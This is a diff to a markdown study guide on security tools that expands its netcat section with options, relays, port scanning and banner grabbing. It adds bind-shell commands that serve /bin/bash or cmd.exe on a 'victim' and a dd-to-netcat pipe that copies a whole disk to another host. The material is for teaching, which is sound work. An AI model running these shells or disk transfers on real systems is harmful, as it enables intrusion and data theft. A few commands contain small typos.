@@ -6,6 +6,21 @@ Demonstrate competence with common tools including netcat, SSH, Ettercap, p0f, e
 
 ### netcat
 
+netcat options:
+
+-l		    Listen (server) mode; default is client mode.
+-L        Listen persistently (continue after first client disconnects); Windows only.
+-l -k     Listen persistently option for Linux.
+-p        Local port number to use (source port in client mode).
+-u        Operate in UDP mode (default is TCP).
+-n        Don’t perform DNS lookups.
+-wN       Timeout in N seconds for client or server mode before exiting.
+-v        Prints verbose status info to stderr.
+-vv       Prints extra verbose info to stderr.
+-e cmd    Execute cmd and pipe netcat IO to program via stdin/stdout.
+-z        When in client mode, emit packets with no payload.
+
+
 Setting up a Listener:
 
 ```
@@ -66,7 +81,7 @@ Run listening shell on Windows (victim):
 nc -l -p 54321 -e cmd.exe
 ```
 
-Create a FIFO named pipe on Linux (attacker):
+#### Create a FIFO named pipe on Linux (attacker) #1:
 
 ```
 mknod backpipe p
@@ -83,7 +98,7 @@ Open new terminal on Linux (attacker) and run netcat to connect to the relay:
 ```
 nc 127.0.0.1 11111
 ```
-Create a TCP Backpipe:
+#### Create a TCP Backpipe #2:
 
 Create a Named Pipe
 ```
@@ -94,8 +109,41 @@ Create an NC relay which forwards the data from the listen service, to the targe
 ```
 nc -l -p <port> 0<backpipe | nc <TargetIP> <port> | tee backpipe
 ```
-The backpipe in this instance (/tmp/ncpipe) is the location where data is stored and fed back into the pipe. Essentially completely a return loop!
+The backpipe in this instance (/tmp/ncpipe) is the location where data is stored and fed back into the pipe. Essentially completing a return loop!
 
+#### TCP Tunnel
+```
+echo nc <Target IP> <port> > relay.bat
+nc -l -p <port> -e relay.bat
+```
+
+#### Remote Shell
+```
+nc -l -p <port> -e /bin/bash
+nc -l -p <port> -e cmd.exe
+```
+
+#### Port Scanning
+```
+nc -v -n -z -w1 -r <Target IP> <portstart>-<portend>
+```
+
+#### Banner Grab
+```
+echo "" | nc -v -n -w1 =r <Target IP> <portstart>-<portend>
+```
+
+#### Makeshift Webserver
+```
+while true; do nc -l -p 80 (or 443) -q 1 < maintenance.html; done
+```
+You have to actually have made a Maintenance file for this to work
+
+#### Remote Partition
+```
+dd if=/dev/sdc | nc <Target IP> <port>
+nc -l -p <port> | dd of=/tmp/sdc.img
+```
 
 ### SSH
 
